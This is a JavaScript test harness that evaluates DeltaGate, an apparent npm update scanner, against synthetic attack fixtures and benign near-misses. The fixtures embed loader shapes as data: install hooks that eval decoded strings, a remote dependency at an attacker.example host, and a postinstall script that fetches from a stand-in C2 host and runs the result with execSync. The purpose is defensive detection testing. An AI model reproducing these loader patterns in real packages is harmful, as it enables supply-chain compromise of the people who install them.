// run.mjs — the DeltaGate evaluation harness.
//
// It measures the one number the whole design hinges on — the false-positive
// rate on real, popular npm updates — alongside recall on reconstructed attack
// shapes. There are three sources of test cases:
//
//   1. SYNTHETIC MALICIOUS fixtures (built in code below). Real 2024–26 payloads
//      aren't redistributable, so we reconstruct the *shapes* the engine keys on
//      (keyv dropper, GlassWorm invisible unicode, PhantomRaven remote dep,
//      chalk/debug decode-exec, obfuscated blob, native drop, net+exec, and a
//      LiteLLM .pth-in-wheel that is deliberately OUT of the npm engine's scope
//      to document the current coverage boundary).
//   2. SYNTHETIC HARD NEGATIVES — benign updates engineered to sit right next to
//      a rule's trigger (a PNG asset, a fetch-only file, an unchanged install
//      hook, a long-line minified bundle) so we catch over-eager rules offline.
//   3. LIVE BENIGN pairs from benign.json — real adjacent versions of popular
//      packages, fetched from the npm registry. These are the negatives that
//      actually matter; skipped gracefully when offline.
//
// A verdict of HOLD (score < 50) counts as "flagged". This is a report, not a
// gate: it always exits 0 and writes eval/last-report.json.

import { createHash } from 'node:crypto';
import { readFileSync, writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { Worker } from 'node:worker_threads';
import { analyzeArtifacts } from '../src/analyze.js';
import { fetchNpm } from '../src/loaders.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const WORKER = new URL('./worker-analyze.mjs', import.meta.url);
const buf = (s) => Buffer.from(s, 'utf8');

// Live analysis in a throwaway thread we can hard-kill. analyzeArtifacts() is
// synchronous, so if the engine hits a pathological input (a ReDoS on a big
// minified bundle, say) it would block the whole event loop; the worker lets us
// terminate it and record the pair as a DoS suspect instead of hanging forever.
function analyzeInWorker(fromFiles, toFiles, subject, timeoutMs) {
  return new Promise((resolve) => {
    const w = new Worker(WORKER);
    let done = false;
    const finish = (r) => { if (done) return; done = true; clearTimeout(timer); w.terminate(); resolve(r); };
    const timer = setTimeout(() => finish({ ok: false, timedOut: true }), timeoutMs);
    w.once('message', (m) => finish(m));
    w.once('error', (e) => finish({ ok: false, error: e.message }));
    w.postMessage({ fromFiles, toFiles, subject });
  });
}

// A deterministic high-entropy, non-media, non-native blob (~8 bits/byte).
// Chained SHA-256 gives uniform-looking bytes with NUL bytes, so profileFile
// classifies it as an opaque binary — the keyv second-stage shape.
function entropyBlob(size) {
  const chunks = [];
  let seed = buf('deltagate-eval-opaque-blob-seed');
  let total = 0;
  while (total < size) {
    seed = createHash('sha256').update(seed).digest();
    chunks.push(seed);
    total += seed.length;
  }
  return Buffer.concat(chunks).subarray(0, size);
}

const C = {
  green: (s) => `\x1b[32m${s}\x1b[0m`,
  red: (s) => `\x1b[31m${s}\x1b[0m`,
  yellow: (s) => `\x1b[33m${s}\x1b[0m`,
  dim: (s) => `\x1b[2m${s}\x1b[0m`,
  bold: (s) => `\x1b[1m${s}\x1b[0m`,
};

// ─────────────────────────────────────────────────────────────────────────────
// 1. Synthetic malicious fixtures — each reconstructs a real attack shape.
// ─────────────────────────────────────────────────────────────────────────────
const MALICIOUS = [];
const mal = (fx) => MALICIOUS.push(fx);

// keyv / Shai-Hulud dropper: new preinstall hook + opaque second stage + decode-exec.
mal({
  id: 'keyv-dropper',
  attack: 'keyv / Shai-Hulud (Sept 2025)',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['INSTALL_HOOK_NEW', 'OPAQUE_BLOB_NEW', 'INSTALL_HOOK_WITH_BLOB', 'EVAL_DECODE_EXEC'],
  from: new Map([
    ['package.json', buf(JSON.stringify({ name: 'cache-thing', version: '5.9.0', scripts: {}, dependencies: {} }))],
    ['index.js', buf("module.exports = require('./lib/store')\n")],
    ['lib/store.js', buf('module.exports = { get(){}, set(){} }\n')],
  ]),
  to: new Map([
    ['package.json', buf(JSON.stringify({ name: 'cache-thing', version: '6.0.0', scripts: { preinstall: 'node setup.mjs' }, dependencies: {} }))],
    ['index.js', buf("module.exports = require('./lib/store')\n")],
    ['lib/store.js', buf('module.exports = { get(){}, set(){} }\n')],
    ['setup.mjs', buf("const p = process.env; eval(Buffer.from('cmVxdWlyZSgnZnMnKQ==','base64').toString());\n")],
    ['Math_Symbol.js', entropyBlob(80 * 1024)], // 80 KB "encrypted" second stage
  ]),
});

// GlassWorm: invisible-unicode payload hidden in a source file.
mal({
  id: 'glassworm-invisible',
  attack: 'GlassWorm (Oct 2025)',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['INVISIBLE_UNICODE'],
  from: new Map([
    ['package.json', buf('{"name":"ui-kit","version":"2.0.0"}')],
    ['index.js', buf("export const version = '2.1.0'\n")],
  ]),
  to: new Map([
    ['package.json', buf('{"name":"ui-kit","version":"2.1.0"}')],
    // variation selectors (U+FE00–FE0F) + tag-block codepoints (U+E0000–E007F):
    // render blank, still parsed/executed — exactly GlassWorm's concealment channel.
    ['index.js', buf("export const version = '2.1.0'\u{FE01}\u{FE0F}\u{E0072}\u{E0075}\u{E006E}\n")],
  ]),
});

// PhantomRaven: a "Remote Dynamic Dependency" — an http URL where a version
// range belongs, so npm fetches attacker code at install time.
mal({
  id: 'phantomraven-remote-dep',
  attack: 'PhantomRaven (2025, Remote Dynamic Dependencies)',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['NON_REGISTRY_DEP'],
  from: new Map([['package.json', buf(JSON.stringify({ name: 'y', version: '1.0.0', dependencies: { chalk: '^5.0.0' } }))]]),
  to: new Map([['package.json', buf(JSON.stringify({ name: 'y', version: '1.1.0', dependencies: { chalk: '^5.0.0', 'unused-helper': 'http://packages.attacker.example/h.tgz' } }))]]),
});

// chalk / debug (Sept 2025): a maintainer-phish compromise that dropped a
// wallet-swapping payload which decodes a string and executes it.
mal({
  id: 'chalk-decode-exec',
  attack: 'chalk / debug maintainer phish (Sept 2025)',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['EVAL_DECODE_EXEC'],
  from: new Map([
    ['package.json', buf('{"name":"chalk","version":"5.3.0"}')],
    ['source/index.js', buf('export default function chalk(s){ return s }\n')],
  ]),
  to: new Map([
    ['package.json', buf('{"name":"chalk","version":"5.3.1"}')],
    ['source/index.js', buf(
      'const _h = window.ethereum;\n' +
      "eval(atob('d2luZG93LmV0aGVyZXVtLnJlcXVlc3Q=')); // decode-then-run payload\n" +
      'export default function chalk(s){ return s }\n')],
  ]),
});

// Heavily obfuscated / packed vendor blob (the shape of the chalk payload's
// minified stage, and countless crypto-stealers): _0x arrays on one huge line.
mal({
  id: 'packed-obfuscation',
  attack: 'packed/obfuscated stealer stage',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['OBFUSCATION_PACKED'],
  from: new Map([
    ['package.json', buf('{"name":"util-lib","version":"1.0.0"}')],
    ['index.js', buf('module.exports = {}\n')],
  ]),
  to: new Map([
    ['package.json', buf('{"name":"util-lib","version":"1.0.1"}')],
    // one line > 3000 chars, _0x identifiers + \x escapes, no eval(atob) so it
    // exercises the OBFUSCATION_PACKED branch specifically.
    ['index.js', buf(
      'var _0xa1b2=[' +
      Array.from({ length: 400 }, (_, i) => `"\\x41\\x42\\x43${(i % 10)}"`).join(',') +
      '];function _0xdeed(_0x1){return _0xa1b2[_0x1]}module.exports=_0xdeed;\n')],
  ]),
});

// First native machine-code binary dropped into a source-only package.
mal({
  id: 'native-binary-drop',
  attack: 'native binary drop (e.g. @0xengine/xmlrpc miner)',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['NATIVE_BINARY_NEW'],
  from: new Map([
    ['package.json', buf('{"name":"fast-thing","version":"2.0.0"}')],
    ['index.js', buf('module.exports = () => 42\n')],
  ]),
  to: new Map([
    ['package.json', buf('{"name":"fast-thing","version":"2.1.0"}')],
    ['index.js', buf('module.exports = () => 42\n')],
    // ELF magic 7f 45 4c 46 + NUL padding => profileFile => native 'ELF'.
    ['bin/helper', Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(2048)])],
  ]),
});

// Remote-payload loader added in one file: fetches from the net AND execs.
mal({
  id: 'net-plus-exec-loader',
  attack: 'install-time remote loader (Shai-Hulud stage)',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['INSTALL_HOOK_NEW', 'NET_PLUS_EXEC'],
  from: new Map([
    ['package.json', buf(JSON.stringify({ name: 'logger-x', version: '1.0.0', scripts: {} }))],
    ['index.js', buf('module.exports = console.log\n')],
  ]),
  to: new Map([
    ['package.json', buf(JSON.stringify({ name: 'logger-x', version: '1.0.1', scripts: { postinstall: 'node loader.js' } }))],
    ['index.js', buf('module.exports = console.log\n')],
    ['loader.js', buf(
      "const https = require('https'); const { execSync } = require('child_process');\n" +
      "https.get('https://c2.attacker.example/p', r => { let d=''; r.on('data',c=>d+=c); r.on('end',()=>execSync(d)); });\n")],
  ]),
});

// Existing install hook quietly repointed at a new script.
mal({
  id: 'install-hook-modified',
  attack: 'repurposed lifecycle hook',
  eco: 'npm',
  expect: 'HOLD',
  wants: ['INSTALL_HOOK_MODIFIED'],
  from: new Map([
    ['package.json', buf(JSON.stringify({ name: 'native-dep', version: '3.0.0', scripts: { postinstall: 'node-gyp rebuild' } }))],
  ]),
  to: new Map([
    ['package.json', buf(JSON.stringify({ name: 'native-dep', version: '3.0.1', scripts: { postinstall: 'node ./scripts/harvest.js' } }))],
  ]),
});

// LiteLLM: a malicious .pth inside a Python wheel, auto-run by the interpreter.
// This is a PyPI shape — the npm-phase engine has no wheel/.pth rule, so it is
// EXPECTED to pass (expect: ALLOW). It documents a real, current blind spot and
// will start failing loudly the day a PyPI layer lands, which is the point.
mal({
  id: 'litellm-pth-wheel',
  attack: 'LiteLLM .pth-in-wheel (Mar 2026)',
  eco: 'pypi',
  expect: 'ALLOW', // known coverage gap for the npm engine
  wants: [],
  note: 'PyPI wheel shape; out of scope for the npm Phase-1 engine — tracked gap.',
  from: new Map([
    ['litellm/__init__.py', buf('__version__ = "1.82.7"\n')],
    ['litellm-1.82.7.dist-info/RECORD', buf('litellm/__init__.py,,\n')],
  ]),
  to: new Map([
    ['litellm/__init__.py', buf('__version__ = "1.82.8"\n')],
    ['litellm-1.82.8.dist-info/RECORD', buf('litellm/__init__.py,,\nlitellm_init.pth,,\n')],
    // Python's site module runs this on every interpreter startup; payload was
    // double-base64 exec. Not a code extension the npm engine scans → invisible.
    ['litellm_init.pth', buf(
      'import base64,os;exec(base64.b64decode(base64.b64decode(' +
      "'ZFdsdVpHOTNMbVYwYUdWeVpYVnQ='" + ')))\n')],
  ]),
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. Synthetic hard negatives — benign, but engineered to graze a trigger.
// ─────────────────────────────────────────────────────────────────────────────
const BENIGN_SYNTH = [];
const ben = (fx) => BENIGN_SYNTH.push(fx);

// A real media asset: high entropy, but a known format => explainable, not opaque.
ben({
  id: 'adds-png-asset',
  reason: 'high-entropy PNG asset (media magic) must not read as an opaque blob',
  from: new Map([['package.json', buf('{"name":"icons","version":"1.0.0"}')], ['index.js', buf('module.exports={}\n')]]),
  to: new Map([
    ['package.json', buf('{"name":"icons","version":"1.1.0"}')],
    ['index.js', buf('module.exports={}\n')],
    ['logo.png', Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), entropyBlob(70 * 1024)])],
  ]),
});

// Uses fetch() but never executes commands — network alone is not a loader.
ben({
  id: 'fetch-only',
  reason: 'network use without command execution must not trip NET_PLUS_EXEC',
  from: new Map([['package.json', buf('{"name":"api-client","version":"2.0.0"}')]]),
  to: new Map([
    ['package.json', buf('{"name":"api-client","version":"2.1.0"}')],
    ['client.js', buf("export async function get(u){ const r = await fetch(u); return r.json(); }\n")],
  ]),
});

// A legit, unchanged native-build hook — hooks only matter when they change.
ben({
  id: 'unchanged-install-hook',
  reason: 'a pre-existing, unchanged postinstall must not fire INSTALL_HOOK_*',
  from: new Map([['package.json', buf(JSON.stringify({ name: 'sharp-ish', version: '1.0.0', scripts: { postinstall: 'node-gyp rebuild' } }))]]),
  to: new Map([['package.json', buf(JSON.stringify({ name: 'sharp-ish', version: '1.0.1', scripts: { postinstall: 'node-gyp rebuild' } }))]]),
});

// A minified bundle: very long lines, but no _0x/\x packing signature.
ben({
  id: 'minified-bundle',
  reason: 'long minified lines alone (no obfuscation signature) must not trip OBFUSCATION_PACKED',
  from: new Map([['package.json', buf('{"name":"bundle","version":"1.0.0"}')], ['dist/app.js', buf('export const a=1\n')]]),
  to: new Map([
    ['package.json', buf('{"name":"bundle","version":"1.0.1"}')],
    ['dist/app.js', buf('export const app=' + JSON.stringify(Array.from({ length: 800 }, (_, i) => ({ id: i, name: 'component' + i, render: 'fn' }))) + ';\n')],
  ]),
});

// ─────────────────────────────────────────────────────────────────────────────
// runner
// ─────────────────────────────────────────────────────────────────────────────
function runCase(fx) {
  const v = analyzeArtifacts(fx.from, fx.to, { ecosystem: fx.eco || 'npm', name: fx.id });
  return {
    id: fx.id,
    flagged: v.verdict === 'HOLD',
    score: v.score,
    verdict: v.verdict,
    codes: v.findings.map((f) => f.code),
    findings: v.findings.map((f) => ({ code: f.code, cap: f.cap, title: f.title, evidence: f.evidence })),
  };
}

function withTimeout(promise, ms, label) {
  let t;
  const timeout = new Promise((_, rej) => { t = setTimeout(() => rej(new Error(`timeout after ${ms}ms (${label})`)), ms); });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(t));
}

async function pool(items, n, fn) {
  const out = new Array(items.length);
  let i = 0;
  const workers = Array.from({ length: Math.min(n, items.length) }, async () => {
    while (i < items.length) { const idx = i++; out[idx] = await fn(items[idx], idx); }
  });
  await Promise.all(workers);
  return out;
}

async function main() {
  const t0 = Date.now();
  console.log(C.bold('\nDeltaGate evaluation harness\n'));

  // ── synthetic malicious ────────────────────────────────────────────────────
  console.log(C.bold('Synthetic malicious fixtures (attack shapes)'));
  const malResults = [];
  for (const fx of MALICIOUS) {
    const r = runCase(fx);
    r.eco = fx.eco;
    r.attack = fx.attack;
    r.expect = fx.expect;
    r.note = fx.note;
    r.wants = fx.wants || [];
    r.wantsHit = r.wants.filter((w) => r.codes.includes(w));
    malResults.push(r);
    const ok = r.verdict === fx.expect;
    const mark = ok ? C.green('✓') : C.red('✗');
    const verdictStr = r.flagged ? C.yellow('HOLD') : 'ALLOW';
    console.log(`  ${mark} ${r.id.padEnd(24)} ${verdictStr}  ${C.dim(`score ${String(r.score).padStart(3)}  ${r.attack}`)}`);
    if (r.wants.length) console.log(`      ${C.dim(`wants [${r.wants.join(', ')}] → hit [${r.wantsHit.join(', ') || '—'}]`)}`);
    if (r.note) console.log(`      ${C.dim('note: ' + r.note)}`);
  }

  // ── synthetic hard negatives ────────────────────────────────────────────────
  console.log(C.bold('\nSynthetic hard negatives (near-miss benign)'));
  const synthNegResults = [];
  for (const fx of BENIGN_SYNTH) {
    const r = runCase(fx);
    r.reason = fx.reason;
    synthNegResults.push(r);
    const ok = !r.flagged;
    const mark = ok ? C.green('✓') : C.red('✗');
    console.log(`  ${mark} ${r.id.padEnd(24)} ${r.flagged ? C.red('HOLD (FP)') : 'ALLOW'}  ${C.dim(`score ${r.score}`)}`);
    if (!ok) console.log(`      ${C.red('unexpected findings:')} ${r.codes.join(', ')}  ${C.dim('— ' + r.reason)}`);
  }

  // ── live benign from the registry ───────────────────────────────────────────
  console.log(C.bold('\nLive benign pairs (npm registry)'));
  let benignList = [];
  try { benignList = JSON.parse(readFileSync(join(HERE, 'benign.json'), 'utf8')); }
  catch (e) { console.log(C.dim(`  could not read benign.json: ${e.message}`)); }

  const liveResults = await pool(benignList, 4, async (b) => {
    const tag = `${b.name} ${b.from}→${b.to}`;
    let from, to;
    try {
      [from, to] = await withTimeout(
        Promise.all([fetchNpm(b.name, b.from), fetchNpm(b.name, b.to)]), 45000, tag,
      );
    } catch (err) {
      return { id: tag, ok: false, skipped: true, reason: `fetch: ${err.message}` };
    }
    // Analyse in a worker so a hung (ReDoS) analysis can be killed, not ride the
    // whole harness down. 20s is ~100x a healthy analysis of these packages.
    const m = await analyzeInWorker(from.files, to.files, { ecosystem: 'npm', name: b.name, from: b.from, to: b.to }, 20000);
    if (m.timedOut) {
      const big = [...to.files.entries()].sort((x, y) => y[1].length - x[1].length)[0];
      return { id: tag, ok: false, skipped: true, redos: true,
        reason: `analysis exceeded 20s — DoS/ReDoS suspect (largest file ${big[0]}, ${(big[1].length / 1e6).toFixed(2)}MB)` };
    }
    if (!m.ok) return { id: tag, ok: false, skipped: true, reason: `analyze: ${m.error}` };
    return {
      id: tag, ok: true, flagged: m.verdict === 'HOLD', score: m.score, verdict: m.verdict,
      codes: m.findings.map((f) => f.code), findings: m.findings,
    };
  });

  for (const r of liveResults) {
    if (r.redos) { console.log(`  ${C.yellow('!')} ${r.id.padEnd(28)} ${C.yellow('DoS SUSPECT')}  ${C.dim('— ' + r.reason)}`); continue; }
    if (r.skipped) { console.log(`  ${C.dim('•')} ${r.id.padEnd(28)} ${C.dim('skipped — ' + r.reason)}`); continue; }
    const mark = r.flagged ? C.red('✗') : C.green('✓');
    console.log(`  ${mark} ${r.id.padEnd(28)} ${r.flagged ? C.red('HOLD (FP)') : 'ALLOW'}  ${C.dim(`score ${r.score}`)}`);
    if (r.flagged) {
      console.log(`      ${C.red('false positive — why the gate held:')}`);
      for (const f of r.findings) {
        console.log(`        ${C.bold(f.code)} ${C.dim(`(caps at ${f.cap}) — ${f.title}`)}`);
        for (const e of f.evidence) console.log(`          ${C.dim(`${e.file} — ${e.detail}`)}`);
      }
    }
  }

  // ── metrics ─────────────────────────────────────────────────────────────────
  const malNpm = malResults.filter((r) => r.eco === 'npm');
  const tp = malNpm.filter((r) => r.flagged).length;
  const fn = malNpm.length - tp;
  const recall = malNpm.length ? tp / malNpm.length : 0;

  const malOther = malResults.filter((r) => r.eco !== 'npm');
  const gapCaught = malOther.filter((r) => r.flagged).length;

  const liveOk = liveResults.filter((r) => r.ok);
  const liveRedos = liveResults.filter((r) => r.redos);
  const liveSkipped = liveResults.filter((r) => r.skipped && !r.redos);
  const negatives = [...synthNegResults.map((r) => ({ ...r, source: 'synthetic' })),
                     ...liveOk.map((r) => ({ ...r, source: 'live' }))];
  const fp = negatives.filter((r) => r.flagged).length;
  const tn = negatives.length - fp;
  const fpRate = negatives.length ? fp / negatives.length : 0;

  const pct = (x) => (x * 100).toFixed(1) + '%';
  console.log(C.bold('\n── Results ─────────────────────────────────────────────'));
  console.log(`  Synthetic npm attack recall : ${C.bold(`${tp}/${malNpm.length}`)}  (${pct(recall)})   ${fn ? C.red(`${fn} missed`) : C.green('none missed')}`);
  if (malOther.length) {
    console.log(`  Cross-ecosystem coverage    : ${gapCaught}/${malOther.length} caught  ${C.dim('(pypi .pth-in-wheel is a tracked npm-engine gap)')}`);
  }
  console.log(`  False positives             : ${fp === 0 ? C.green('0') : C.red(String(fp))}/${negatives.length}  (FP rate ${fp === 0 ? C.green(pct(fpRate)) : C.red(pct(fpRate))})`);
  console.log(`      synthetic negatives     : ${synthNegResults.filter((r) => r.flagged).length}/${synthNegResults.length} flagged`);
  console.log(`      live benign             : ${liveOk.filter((r) => r.flagged).length}/${liveOk.length} flagged` + (liveSkipped.length ? C.dim(`  (${liveSkipped.length} skipped)`) : ''));
  if (liveRedos.length) {
    console.log(`  ${C.yellow('DoS / ReDoS suspects')}        : ${C.yellow(String(liveRedos.length))}  ${C.dim('(analysis never terminated on a real, popular package)')}`);
    for (const r of liveRedos) console.log(`      ${C.yellow('!')} ${r.id} — ${r.reason}`);
  }

  console.log(C.bold('\n  Confusion matrix  ') + C.dim('(positive = malicious; HOLD = flagged)'));
  const totalPos = malResults.length;
  const posFlagged = malResults.filter((r) => r.flagged).length;
  console.log(`                    ${C.dim('flagged (HOLD)   allowed')}`);
  console.log(`    malicious (${String(totalPos).padStart(2)})     ${String(posFlagged).padStart(6)}       ${String(totalPos - posFlagged).padStart(6)}`);
  console.log(`    benign    (${String(negatives.length).padStart(2)})     ${String(fp).padStart(6)}       ${String(tn).padStart(6)}`);

  if (benignList.length > 0 && liveOk.length === 0 && liveRedos.length === 0) {
    console.log(C.yellow('\n  All live pairs were skipped — likely offline. FP rate reflects synthetic negatives only.'));
  }

  // ── report file ─────────────────────────────────────────────────────────────
  const report = {
    generatedAt: new Date().toISOString(),
    durationMs: Date.now() - t0,
    summary: {
      syntheticNpmRecall: recall,
      syntheticNpmTP: tp,
      syntheticNpmFN: fn,
      crossEcosystemCaught: gapCaught,
      crossEcosystemTotal: malOther.length,
      falsePositives: fp,
      trueNegatives: tn,
      negativesEvaluated: negatives.length,
      falsePositiveRate: fpRate,
      liveEvaluated: liveOk.length,
      liveSkipped: liveSkipped.length,
      redosSuspects: liveRedos.length,
    },
    redosSuspects: liveRedos.map((r) => ({ id: r.id, reason: r.reason })),
    malicious: malResults,
    syntheticNegatives: synthNegResults,
    liveBenign: liveResults,
  };
  const outPath = join(HERE, 'last-report.json');
  writeFileSync(outPath, JSON.stringify(report, null, 2) + '\n');
  console.log(C.dim(`\n  wrote ${outPath}`));
  console.log(C.dim(`  done in ${((Date.now() - t0) / 1000).toFixed(1)}s\n`));

  process.exit(0); // a report, never a gate
}

main().catch((err) => { console.error(`run: ${err.stack || err.message}`); process.exit(0); });
